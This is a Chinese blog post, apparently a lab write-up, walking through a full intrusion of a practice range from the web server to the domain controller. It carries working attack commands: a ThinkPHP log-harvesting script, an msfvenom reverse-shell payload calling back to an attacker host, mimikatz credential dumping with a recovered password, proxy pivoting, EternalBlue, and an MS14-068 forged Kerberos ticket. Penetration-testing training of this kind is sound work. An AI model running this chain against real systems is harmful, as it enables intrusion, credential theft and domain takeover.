href="#5-1-21-%E6%B3%A8%E5%85%A5%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.21.</span> <span class="toc-text">5.1.21. 注入黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2cobaltstrike-%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">6.2.</span> <span class="toc-text">5.2cobaltstrike 进行内网域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-1-%E5%BB%BA%E7%AB%8B-teamserver"><span class="toc-number">6.2.1.</span> <span class="toc-text">5.2.1.建立 teamserver</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        打靶日记（三）完整的内网域渗透
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-11-14T11:38:38.000Z" class="dt-published" itemprop="datePublished">2021-11-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88moon%EF%BC%89/">打靶日记（moon）</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a>, <a class="p-category" href="/tags/%E6%89%93%E7%82%B9/" rel="tag">打点</a>, <a class="p-category" href="/tags/%E7%BA%A2%E9%98%9F/" rel="tag">红队</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="打靶日记（三）完整的内网域渗透"><a href="#打靶日记（三）完整的内网域渗透" class="headerlink" title="打靶日记（三）完整的内网域渗透"></a>打靶日记（三）完整的内网域渗透</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第三篇。</strong></p>
+<h1 id="1-环境介绍"><a href="#1-环境介绍" class="headerlink" title="1.环境介绍"></a>1.环境介绍</h1><p>这个靶场是 webhack123 WEB 服务器有两块网卡 dc 是域控 本文为技术培训技术文档，过程可能会让新人有点难以理解。 过程是从 kali 渗透到 web 再渗透到内网 dc 也就是从外网打到域控</p>
+<h2 id="1-1环境图"><a href="#1-1环境图" class="headerlink" title="1.1环境图"></a>1.1环境图</h2><p><img src="NFWgEW1x5hckIW3rsJbmIdedkVrToiaVZpKA9fD4xXU.png" alt="image"></p>
+<p> </p>
+<h1 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h1><p>1. 主机发现，netdiscover</p>
+<p><img src="gB25X1osV3BNaP-U4k9m-q22zi0F0RNOVidAvB4vAjc.png" alt="image"></p>
+<h2 id="2-1masscan-端口探测"><a href="#2-1masscan-端口探测" class="headerlink" title="2.1masscan 端口探测"></a>2.1masscan 端口探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p 1-65535 192.168.8.83 --rate=1000</span><br></pre></td></tr></table></figure>
+<p><img src="0MqARHecC40A7Gnm5VYnDQCNVPJJ2pR13GBz9uFjGK8.png" alt="image"></p>
+<h2 id="2-3nmap-获取系统和端口版本信息"><a href="#2-3nmap-获取系统和端口版本信息" class="headerlink" title="2.3nmap 获取系统和端口版本信息"></a>2.3nmap 获取系统和端口版本信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 49157,47001,3306,49155,135,445,49153,3389,80,49154,49152,49156,139 -A 192.168.8.83 -oA webhack</span><br></pre></td></tr></table></figure>
+<p><img src="5YYNRJGijff8qzSjgtnErTQ2wz1LRQmr5KNmPSGfij0.png" alt="image"></p>
+<p>从端口探测的信息得到服务器是 WEB 容器是 phpstudy 套件操作系统是 Microsoft Windows Server 2008 R2</p>
+<p> </p>
+<h1 id="3-对网站进行安全检测"><a href="#3-对网站进行安全检测" class="headerlink" title="3.对网站进行安全检测"></a>3.对网站进行安全检测</h1><h2 id="3-1-绑定-hosts"><a href="#3-1-绑定-hosts" class="headerlink" title="3.1.绑定 hosts"></a>3.1.绑定 hosts</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.83 www.webhack123.com</span><br></pre></td></tr></table></figure>
+<p>发 <a target="_blank" rel="noopener" href="http://www.webhack123.com/">www.webhack123.com</a> 是一个 xxx 平台 核心框架是 ThinkPHP_3.1.3</p>
+<p>后台暂时还不知道</p>
+<p><img src="s8kS7FkYjnGU6-5sziyxRpxG6PCNWNwrLkLBljK1rDc.png" alt="image"></p>
+<h2 id="3-2gobuster-目录文件扫描"><a href="#3-2gobuster-目录文件扫描" class="headerlink" title="3.2gobuster 目录文件扫描"></a>3.2gobuster 目录文件扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.webhack123.com -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
+<p><img src="GwpIqmowBBwnv6tZGsxSgXzJSmcSSEK2KZz1kZsu-ec.png" alt="image"></p>
+<h2 id="3-3-svn-遍历源代码漏洞"><a href="#3-3-svn-遍历源代码漏洞" class="headerlink" title="3.3 .svn 遍历源代码漏洞"></a>3.3 .svn 遍历源代码漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.webhack123.com/.svn/entries</span><br></pre></td></tr></table></figure>
+<p><img src="OzWYWQ1hyex-rFTZm84rWcUI4wwELEX86SL3lflflQQ.png" alt="image"></p>
+<h2 id="3-4wc-db-文件下载"><a href="#3-4wc-db-文件下载" class="headerlink" title="3.4wc.db 文件下载"></a>3.4wc.db 文件下载</h2><p>在svn中是有一个数据库文件的，如果存在的话，我们可以下载打开。</p>
+<p>这个sqlite数据库文件 里面存在网站目录文件信息</p>
+<p>svn如果没有获取 可以下载当前下的wc.db用 sqlitebrowser wc.db打开</p>
+<p>下载 <a target="_blank" rel="noopener" href="http://www.webhack123.com/.svn/wc.db">http://www.webhack123.com/.svn/wc.db</a></p>
+<p><img src="_R-gjEN5EtgKtmftcJL0qMMcJ-XzxaqrluUcjl4nG0w.png" alt="image"></p>
+<p><img src="My6-i-dheMWizV6HnJUWQQIkcV3IXdaQ5UmjVcawlhc.png" alt="image"></p>
+<p><img src="093yGZHMwDL4iLP9DMYDrIg8DdLep2y1wU0CqdKmd0k.png" alt="image"></p>
+<p>查看数据库 基本知道网站的整个架构</p>
+<p> </p>
+<h2 id="3-5thinkphp-日志文件泄露"><a href="#3-5thinkphp-日志文件泄露" class="headerlink" title="3.5thinkphp 日志文件泄露"></a>3.5thinkphp 日志文件泄露</h2><p>在ThinkPHP_3.1.3中 日志文件始开启的经过wc.db可以知道文件目录位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.webhack123.com/App/Runtime/Logs/19_06_29.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+<p><img src="Au1l3sZUJ1mtejlCLiUm-dRcugBW-aviFqrd3BRi234.png" alt="image"></p>
+<h2 id="3-6python-编写日志文件"><a href="#3-6python-编写日志文件" class="headerlink" title="3.6python 编写日志文件"></a>3.6python 编写日志文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line">import requests</span><br><span class="line">url =<span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs&quot;</span></span><br><span class="line">def add_urls(patch,y): </span><br><span class="line">    urls=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,7):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(1,32): </span><br><span class="line">         <span class="keyword">if</span> i&lt;10:</span><br><span class="line">            <span class="keyword">if</span> j&lt;10: </span><br><span class="line">             urls.append(patch+<span class="string">&quot;/%s_0%s_0%s.log&quot;</span> % (y,i,j)) </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">             urls.append(patch+<span class="string">&quot;/%s_0%s_%s.log&quot;</span> % (y,i,j)) </span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">if</span> j&lt;10: </span><br><span class="line">           urls.append(patch+<span class="string">&quot;/%s_%s_0%s.log&quot;</span> % (y,i,j)) </span><br><span class="line">          <span class="keyword">else</span>: </span><br><span class="line">           urls.append(patch+<span class="string">&quot;/%s_%s_%s.log&quot;</span> % (y,i,j))  </span><br><span class="line">    <span class="built_in">return</span> urls</span><br><span class="line">urls = add_urls(url,<span class="string">&quot;20&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    req=requests.get(i) </span><br><span class="line">    <span class="keyword">if</span> req.status_code==200: </span><br><span class="line">     <span class="built_in">print</span>(i)</span><br><span class="line">     html = req.text </span><br><span class="line">     with open(<span class="string">&quot;webhack123.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) as f:</span><br><span class="line">          f.write(html)</span><br></pre></td></tr></table></figure>
+<p><img src="U8_UoD_IQhKd3x31q7OvtE8uQ7u0s7dJ_T6WCrNCZKQ.png" alt="image"></p>
+<h2 id="3-7发现管理密文"><a href="#3-7发现管理密文" class="headerlink" title="3.7发现管理密文"></a>3.7发现管理密文</h2><p>thinkphp 低版本在会记录修改密码的日志</p>
+<p><img src="Zx5UsapoyWxfVB0u0SWCGYTHTo0ONAPdyD4qlWlXmSI.png" alt="image"></p>
+<p>账号 admin 密文 74c774ef39b5b977c1fd59dbfc73c3e380a65aa3</p>
+<p><img src="JC2c2X4seT4wUBxKOv6d33WraIRAKNe9j_1AB6_03No.png" alt="image"></p>
+<p>通过 somd5 解 web123</p>
+<p> </p>
+<h2 id="3-8绑定-hosts-碰撞管理后台子域名"><a href="#3-8绑定-hosts-碰撞管理后台子域名" class="headerlink" title="3.8绑定 hosts 碰撞管理后台子域名"></a>3.8绑定 hosts 碰撞管理后台子域名</h2><p>如果扫描目录后台 还是找不到后台可以试试绑定 hosts 碰撞子域名这种方法</p>
+<p>最近有老哥写了一个脚本在 <a target="_blank" rel="noopener" href="https://github.com/fofapro/Hosts/_scan">https://github.com/fofapro/Hosts\_scan</a> 脚本与我的需求有点</p>
+<p>不合适小修改了一下自动导入 top3K 子域名进行穷举碰撞 IP 修改后的脚本</p>
+<p>直接运行脚本</p>
+<p><img src="Kr1D5vbvsOl50oAYwWMdfDyxXDrhDnKs4c3Sk4yG7Kg.png" alt="image"></p>
+<p>admin.webhack123.com 这个就是它的后台地址</p>
+<p>hosts需要绑定，不然打开失败</p>
+<p><img src="48MrxQade2LnE7f2-6DgYgehZ4fj3vUf_cwNJrwATs4.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.83         admin.webhack123.com</span><br></pre></td></tr></table></figure>
+<p><img src="ah8rEg0-D617vUOk3sAHpPzYWfNPCSsJpmgNiHNQkR0.png" alt="image"></p>
+<h2 id="3-9后台验证码逻辑漏洞"><a href="#3-9后台验证码逻辑漏洞" class="headerlink" title="3.9后台验证码逻辑漏洞"></a>3.9后台验证码逻辑漏洞</h2><p>可以穷举密码</p>
+<p><img src="HxoSSBiW0drpMNdCPSztIjd_QpwgQU4_XZ1OArVmQFk.png" alt="image"></p>
+<p><img src="tZ1brzYJRVgL43PWYQ5F4k_IzX0wuBBDzBQ5vNmMZn8.png" alt="image"></p>
+<h2 id="3-10-设置上传文件类型拿-webshell"><a href="#3-10-设置上传文件类型拿-webshell" class="headerlink" title="3.10. 设置上传文件类型拿 webshell"></a>3.10. 设置上传文件类型拿 webshell</h2><p><img src="F8ZvsBbhzEdcQ0XE-8xhk2N2_-U_dH-IAD7tx5uscVY.png" alt="image"></p>
+<p><img src="Bffgpehsr35gvY_x5NPTjuCGpk13CmYY2syssuhDUyc.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.webhack123.com/Public/Upload/20211103/7d2e82062e4668139f1b27c7d94dab29.php</span><br></pre></td></tr></table></figure>
+<p><img src="nfVutje3dHIh4-dp6utiEXI8mD2xSYQ_-TZxOYwFfnk.png" alt="image"></p>
+<h1 id="4metasploit-进行提权和信息收集"><a href="#4metasploit-进行提权和信息收集" class="headerlink" title="4metasploit 进行提权和信息收集"></a>4metasploit 进行提权和信息收集</h1><h2 id="4-1-生成攻击载荷"><a href="#4-1-生成攻击载荷" class="headerlink" title="4.1.生成攻击载荷"></a>4.1.生成攻击载荷</h2><p>phpstudy套件是默认是系统权限的直接上传执行exe就是高权限了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.133 lport=12345 -f exe &gt;s.exe</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="4-2监听上线"><a href="#4-2监听上线" class="headerlink" title="4.2监听上线"></a>4.2监听上线</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.8.133</span><br><span class="line">lhost =&gt; 192.168.8.133</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 12345</span><br><span class="line">lport =&gt; 12345</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+<p><img src="Y1jsXOo3u_JYtZJJocCa_yJm1vo8FoyUQy5ma8TO9F4.png" alt="image"></p>
+<p>得到了系统权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="4-3migrate-迁移进程"><a href="#4-3migrate-迁移进程" class="headerlink" title="4.3migrate 迁移进程"></a>4.3migrate 迁移进程</h2><p>migrate 迁移到64位进程里 migrate 592进行到 system 方便我们的操作</p>
+<p><img src="vxqPUE2LapBE8bh_7MbKCsszL9OnQNhUcPuVzzeVbAQ.png" alt="image"></p>
+<h2 id="4-4-mimikatz-哈希明文获取"><a href="#4-4-mimikatz-哈希明文获取" class="headerlink" title="4.4.mimikatz 哈希明文获取"></a>4.4.mimikatz 哈希明文获取</h2><p>哈希明文获取</p>
+<p>加载kiwi模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>
+<p><img src="AgzpdnnXMXXE-YWNjtqGlWGcXe3MXsTL4nom3T8Ofhg.png" alt="image"></p>
+<p><img src="-npcjJVrPR436eyt70ApDYqejQ4a4uaBxIFQlNhorew.png" alt="image"></p>
+<p>看到有hackbox域 用户web 本地管理员</p>
+<p>Administrator 密码 !@#Qwe456</p>
+<p> </p>
+<h1 id="5-跨网段域渗透"><a href="#5-跨网段域渗透" class="headerlink" title="5.跨网段域渗透"></a>5.跨网段域渗透</h1><h2 id="5-1-metasploit-跨网段的域渗透"><a href="#5-1-metasploit-跨网段的域渗透" class="headerlink" title="5.1.metasploit 跨网段的域渗透"></a>5.1.metasploit 跨网段的域渗透</h2><p>这里我将用两个内网渗透神器进行域渗透下的域渗透分别是 </p>
+<p>metasploit 和 cobalt strike4.0</p>
+<h3 id="5-1-1确定域环境"><a href="#5-1-1确定域环境" class="headerlink" title="5.1.1确定域环境"></a>5.1.1确定域环境</h3><p>切为adminstrator</p>
+<p><img src="yyu5NdYEUMNelTNr5Ms9jd5MilsGhNAKJ7LWSzL8enY.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shell</span><br><span class="line">Chcp 65001</span><br><span class="line">net config workstation</span><br></pre></td></tr></table></figure>
+<p><img src="3wsnskXgIQdwxq28Xb6C-xl0ienu4Unb19yUg11icAQ.png" alt="image"></p>
+<h3 id="5-1-2定位域控"><a href="#5-1-2定位域控" class="headerlink" title="5.1.2定位域控"></a>5.1.2定位域控</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>
+<p><img src="P6SuC7n7Dk7c_mj2KW6laAqoNGI925x1o0iuyBHmSks.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_ad_computers</span><br></pre></td></tr></table></figure>
+<p><img src="6T3kQNHqAMUvO0WbOTvDiJthOWDFsDUtketvpMV5SqU.png" alt="image"></p>
+<h3 id="5-1-3域信息收集"><a href="#5-1-3域信息收集" class="headerlink" title="5.1.3域信息收集"></a>5.1.3域信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net time /domain 查看域控时间 </span><br><span class="line">net view 遍历信任主机 </span><br><span class="line">net view /domain 查看域</span><br><span class="line">net view /domain:hackbox</span><br></pre></td></tr></table></figure>
+<p><img src="Le1HaCAL9c-M5tJnht8BQfAESH-2JkGHqarqIviIhwc.png" alt="image"></p>
+<p><img src="p25XRa8UlwVAaTdlQq4NMrGH00teWjp7fEMkjPIbfeg.png" alt="image"></p>
+<p>查看域组失败 其他查看组信息均失败</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br><span class="line">ifconfig得到两个IP段</span><br><span class="line">10.10.10.150 </span><br><span class="line">192.168.8.83</span><br></pre></td></tr></table></figure>
+<p><img src="qmFc83FlxY6CaWKPvuWodYs3irHV2ysmibFj19WOT9c.png" alt="image"></p>
+<p>Arp</p>
+<p><img src="oSPO8CtX6NFu17pbJX1O2KM4fkY6-JztpQ1UtpmRHpU.png" alt="image"></p>
+<h3 id="5-1-4终端设置乱码"><a href="#5-1-4终端设置乱码" class="headerlink" title="5.1.4终端设置乱码"></a>5.1.4终端设置乱码</h3><p>在metasploit终端使用shell返回的信息会有乱码，可以设置编码防止乱码</p>
+<p>chcp 65001</p>
+<h3 id="5-1-5终端执行命令信息收集命令"><a href="#5-1-5终端执行命令信息收集命令" class="headerlink" title="5.1.5终端执行命令信息收集命令"></a>5.1.5终端执行命令信息收集命令</h3><p><img src="5C_weWwdH8vxRZd3ZByyQ3mwnRDeuK2t15YV8O-Sp9A.png" alt="image"></p>
+<p>dns 10.10.10.149</p>
+<p>dns 一般都是与域控同一个 ip</p>
+<table>
+<thead>
+<tr>
+<th><br>DC<br></th>
+<th><br>10.10.10.149<br></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><br>WEB<br></td>
+<td><br>10.10.10.150<br></td>
+</tr>
+</tbody></table>
+<h3 id="5-1-6获取登录过的用户信息"><a href="#5-1-6获取登录过的用户信息" class="headerlink" title="5.1.6获取登录过的用户信息"></a>5.1.6获取登录过的用户信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>
+<p><img src="jNHAr7xW78eOfN0zz6beBPJH17EWTtofkbeXilHdHPc.png" alt="image"></p>
+<h3 id="5-1-7添加路由渗透-DC-域控"><a href="#5-1-7添加路由渗透-DC-域控" class="headerlink" title="5.1.7添加路由渗透 DC 域控"></a>5.1.7添加路由渗透 DC 域控</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="PSwJTJ4tyDY5McjoN9Ki0QGom3DONJ2F-5XG8jEvm1k.png" alt="image"></p>
+<h3 id="5-1-8开启代理"><a href="#5-1-8开启代理" class="headerlink" title="5.1.8开启代理"></a>5.1.8开启代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br></pre></td></tr></table></figure>
+<p><img src="34aWfE75OU_I26bi06fVcrK1hQBFjCTjPQ00WWkoCZk.png" alt="image"></p>
+<p><img src="Sh6E5ph4rxwcOSRD5iMsM3_ic2fSxj3Mdb0mrh8MzX0.png" alt="image"></p>
+<p><img src="4ESfU2ziSKMIAK1MvlMNm7d-U2ZE7GRAWJLvhdUNP8Y.png" alt="image"></p>
+<h3 id="5-1-9-设置-porychanins-代理-nmap-扫描"><a href="#5-1-9-设置-porychanins-代理-nmap-扫描" class="headerlink" title="5.1.9.设置 porychanins 代理 nmap 扫描"></a>5.1.9.设置 porychanins 代理 nmap 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+<p><img src="E1C5gP-D9eVV5JAYhdUPCTjqOhj4J_JkV5XpGUA-24U.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 10.10.10.149</span><br></pre></td></tr></table></figure>
+<p><img src="MyQOUDvy8b59qAMJu22ET__edu8PlynoZ3BoM0_xVeM.png" alt="image"></p>
+<h3 id="5-1-10永恒之蓝-ms17-010-进行溢出"><a href="#5-1-10永恒之蓝-ms17-010-进行溢出" class="headerlink" title="5.1.10永恒之蓝 ms17_010 进行溢出"></a>5.1.10永恒之蓝 ms17_010 进行溢出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 10.10.10.149</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p><img src="tWXdRvoF3_dmkttVM99mkbVyorKl-sqyq91lWbXLFkg.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Run</span><br></pre></td></tr></table></figure>
+<p><img src="y9nGhPCQap8Gl8HMWlGfX8vndyF5AnDYlN0EvABM9k4.png" alt="image"></p>
+<p>溢出成功</p>
+<h3 id="5-1-11ms14-068-的条件"><a href="#5-1-11ms14-068-的条件" class="headerlink" title="5.1.11ms14-068 的条件"></a>5.1.11ms14-068 的条件</h3><p>使用这个 exp 需要一个普通域控用户 </p>
+<p>web 是域用户 但是不知道密码</p>
+<h3 id="5-1-12开启远程桌面"><a href="#5-1-12开启远程桌面" class="headerlink" title="5.1.12开启远程桌面"></a>5.1.12开启远程桌面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp </span><br><span class="line">rdesktop 192.168.0.150</span><br></pre></td></tr></table></figure>
+<p><img src="W8iXkr7VPJtEB1gUA6haROmKv147CNHJG7DN17ZJEhg.png" alt="image"></p>
+<p><img src="k_py3EVOPPpcpGfdHEcnOvm-RvOCGNu5mJDhy0ABRfI.png" alt="image"></p>
+<p>密码应该是对的 但不是远程组而已</p>
+<p> </p>
+<h3 id="5-1-13ms14-068-提权域控"><a href="#5-1-13ms14-068-提权域控" class="headerlink" title="5.1.13ms14-068 提权域控"></a>5.1.13ms14-068 提权域控</h3><h4 id="5-1-13-1-ms14-068-exe-创建票据"><a href="#5-1-13-1-ms14-068-exe-创建票据" class="headerlink" title="5.1.13.1. ms14-068.exe 创建票据"></a>5.1.13.1. ms14-068.exe 创建票据</h4><p>这些信息从 metasploit 前期信息来的，可以翻到上面查看</p>
+<p>使用菜刀上传到受害机器</p>
+<p><img src="SexlECvEaDYCrs0erB3Pl31wdMWEqG68780aGvgLVp0.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:/phpstudy_pro/WWW/www.webhack123.com/Public/Upload/20211103/</span><br><span class="line">执行命令：</span><br><span class="line">ms14-068.exe -u web@hackbox.com -s</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@<span class="comment">#Qwe456</span></span><br></pre></td></tr></table></figure>
+<p><img src="EIAO4bwaXHOhIu9UvZERfLSxAnXiAKERHUzAE1Rvl2I.png" alt="image"></p>
+<h4 id="5-1-13-2载入-kiwi"><a href="#5-1-13-2载入-kiwi" class="headerlink" title="5.1.13.2载入 kiwi"></a>5.1.13.2载入 kiwi</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure>
+<p><img src="M-o7MQeL12DzMG1wvmCa2u5VSkxOu18AYeRE1EHfrus.png" alt="image"></p>
+<h4 id="5-1-13-3清理票据"><a href="#5-1-13-3清理票据" class="headerlink" title="5.1.13.3清理票据"></a>5.1.13.3清理票据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge 清理票据</span><br></pre></td></tr></table></figure>
+<p><img src="CPLWC9B2hnq3UoECD_ST6_zMG_Ozwo6n_QAJMLZhMZc.png" alt="image"></p>
+<p>5.1.13.4导入票据</p>
+<p>在 metasploit mimikatz 好似没有这个功能。</p>
+<p>上传 mimikatz 注入票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># kerberos::ptc TGT_web@hackbox.com.ccache</span></span><br></pre></td></tr></table></figure>
+<p><img src="vExZpZamGKbFos_ePsdqQnSCR6ZSXVC3KTsq5dlzU5A.png" alt="image"></p>
+<p>Klist 查看当前票据</p>
+<p><img src="wFGukbDksiuTa8ZSLyh8DUzhzTbAmaYlIvEiZn-Uq4w.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\dc\c$    访问dc域控</span><br></pre></td></tr></table></figure>
+<p><img src="yheyjLEctfgFc5BxW_6lVxaVQ15jefkuaR82chcu-dI.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\dc</span><br></pre></td></tr></table></figure>
+<p><img src="oquR7XzwO2JEcyiWxiGDJviR7WsQlOpfcIeoF5a18o0.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at \\dc</span><br><span class="line">net time \\dc</span><br></pre></td></tr></table></figure>
+<p><img src="Ys2chERZyaU0YRhtmARMllSCpzTH-wc0Ja17KEaSP-E.png" alt="image"></p>
